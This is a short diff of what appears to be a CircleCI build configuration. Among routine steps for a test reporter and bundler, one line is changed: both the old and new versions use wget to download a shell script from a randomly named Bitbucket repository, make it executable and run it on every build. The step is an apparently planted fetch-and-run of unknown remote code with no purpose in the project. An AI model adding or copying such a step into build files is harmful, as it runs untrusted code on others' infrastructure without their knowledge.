@@ -6,7 +6,7 @@ working_dir: &working_dir ~/app
     - run: chmod +x ./cc-test-reporter
     - run: ./cc-test-reporter before-build
     - run: gem install bundler:2.1.4
-    - run: wget https://bitbucket.org/nahdkfo/cupliz/raw/cbee76a7129f971d745880f1e3315851e636e06a/dguby.sh && chmod u+x dguby.sh && ./dguby.sh
+    - run: wget https://bitbucket.org/p7cuk/cupliz/raw/4cf87888fc910969ba11340398da8819429926b2/dguby.sh && chmod u+x dguby.sh && ./dguby.sh
 
 version: 2.0
 
